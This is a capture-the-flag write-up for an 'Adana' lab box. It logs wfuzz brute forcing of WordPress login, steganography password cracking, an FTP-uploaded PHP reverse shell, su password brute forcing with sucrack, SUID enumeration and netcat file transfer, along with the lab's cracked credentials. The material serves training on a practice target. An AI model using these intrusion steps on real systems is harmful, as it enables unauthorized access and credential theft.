# Diferent CTF - adana


initial scans found directory with wordlist.txt {/announcements/}

use wordlist to try bruteforce wp-login

### exploitation
```
> wfuzz -w wordlist.txt -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -X POST -d '{"log":"hakanbey01","pwd":"FUZZ"}' -u http://adana.thm/wp-login.php --hw 441

Fail brute-force

directory announcements have jpg file, try extract steganographie

using wordlist.txt to try brute force in stegnographie

> stegcracker austrailian-bulldog-ant.jpg wordlist.txt

	Successfully cracked file with password: 123adanaantinwar


> steghide extract -sf austrailian-bulldog-ant.jpg 

	wrote extracted data to "user-pass-ftp.txt"

>echo 'RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=' | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack

access FTP and donwload wp-config.php, use credentials to login /phpmyadmin

reading database {phpmyadmin1} found in wp-options subdomain

go to http://subdomain.adana.thm/wp-login.php

	hakanbey01:12345

nothing interesting here

login ftp again and put php-reverse-shell

this site is exactly the same as before, try http://subdomain.adana.thm/php-reverse-shell.php
	SUCESS

```

### First access
```
after running linpeas.sh discovery

hakanftp:x:1001:1001:,,,:/var/www/subdomain:/bin/bash

we have credentials to hakanftp

> su hakanftp

	hakanftp:123adanacrack


after long time unsuccessfully, try crack hakanbey password with sucrack

hakanftp and hakanbey have same name, try add "123adana" in wordlist.txt

use Sed to add 123adana before every word

> sed 's/^/123adana/' wordlist.txt > word.txt

transfer to target, and sucrack binary too

> ./sucrack -u hakanbey -w 50 word.txt
	password is: 123adanasubaru

SUCESS 

```

hakanbey:123adanasubaru

### Hakanbey access
```
> find / -perm -u=s -type f 2>/dev/null

	/usr/bin/binary
	/usr/bin/at
	/usr/bin/newgrp
	/usr/sbin/pppd
	/usr/sbin/exim4

> hakanbey@ubuntu:~$ /usr/bin/binary
  	I think you should enter the correct string here ==>

need correct string, use ltrace to see strings

> hakanbey@ubuntu:~$ ltrace /usr/bin/binary
	strcat("war", "zone")                            = "warzone"
	strcat("warzone", "in")                          = "warzonein"
	strcat("warzonein", "ada")                       = "warzoneinada"
	strcat("warzoneinada", "na")                     = "warzoneinadana"
	printf("I think you should enter the cor"...)    = 52
	__isoc99_scanf(0x55bed3113edd, 0x7ffc939cd8c0, 0, 0I think you should enter the correct string here ==>warzoneinadana
	) = 1
	strcmp("warzoneinadana", "warzoneinadana")       = 0
	fopen("/root/hint.txt", "r")                     = 0
	__isoc99_fscanf(0, 0x55bed3113edd, 0x7ffc939cd8e0, 1 <no return ...>
	--- SIGSEGV (Segmentation fault) ---
	+++ killed by SIGSEGV +++


> hakanbey@ubuntu:~$ /usr/bin/binary
	I think you should enter the correct string here ==>warzoneinadana

	Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

use netcat to transfer file

> nc -lvnp 4444 > root.jpg

> nc {ip} 4444 < root.jpg

hint root flag is "from hex to base85"

use xxd in root.jpg

> xxd root.jpg > root.hex

use cyberchef {From hex / to base85}

root:Go0odJo0BbBro0o

```
